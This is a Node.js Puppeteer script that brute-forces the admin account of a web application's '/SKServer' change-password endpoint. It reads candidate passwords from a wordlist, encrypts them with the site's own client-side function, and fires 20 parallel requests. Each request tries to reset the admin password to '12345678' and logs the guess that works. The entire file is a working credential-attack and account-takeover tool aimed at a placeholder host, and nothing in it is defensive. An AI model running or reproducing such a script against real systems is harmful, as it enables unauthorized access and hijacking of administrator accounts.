const puppeteer = require("puppeteer");

async function main(password, thead, url) {
     const userAgent = 'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36';
     const browser = await puppeteer.launch({args: ['--no-sandbox', '--disable-dev-shm-usage']});
     const page =await browser.newPage();
     await page.setUserAgent(userAgent);
     await page.goto(url+'/SKServer/modifyPwd.jsp');
     await page.waitFor(2000);
     
     const paramDict = {
        'username' : 'admin',
        'newmm' : 'ZWJmYTQ3NGQsYTdmYzA4NGUsZTZiMGFjMGQsZjBhMDkwOWQ=', //encryptLoginPwd('12345678', false)
        'bbb' : '12345678',
        'aaa' : '12345678'
     };


     const res = await page.evaluate( (password) => {
        const resArr = [];
        password.forEach(function(ps){
             resArr.push(encryptLoginPwd(ps, true));
        })
        return resArr;
     }, password)

    const param = (paramDict) => {
            const arr = [];
            for (var key in paramDict){
                arr.push(key+'='+paramDict[key]);
            }
            return arr.join('&');
    };

    for(let i=0, len=res.length;i<len; i+=thead){
        const promises=[];
        res.slice(i,i+thead).forEach(function(encPass, key){
        paramDict.ymm = encPass;
        const bruteurl = url+"/SKServer/sys/xgcsmm.do?"+param(paramDict);
        promises.push(browser.newPage().then(async page => {
            await page.setUserAgent(userAgent);
            await page.goto(bruteurl, {timeout: 1000});
            const html = await page.content();
            //console.log(html);
            if(html.length != 134){
                console.log(html+' OldPasswordEnc: '+ res[key] +' NowPassword: 12345678');
            }
            await page.close();
        }))
        }) 
        await Promise.all(promises);
    }
    browser.close();
};

function readTxt(txtName) {
    const fs = require("fs");
    const res = fs.readFileSync(txtName).toString().split("\n");
    return res;
}

const txtName = 'password.txt';
const password = readTxt(txtName);
const thead = 20; //open 20 multiple pages
const url = "http://xxx.com";

main(password, thead, url);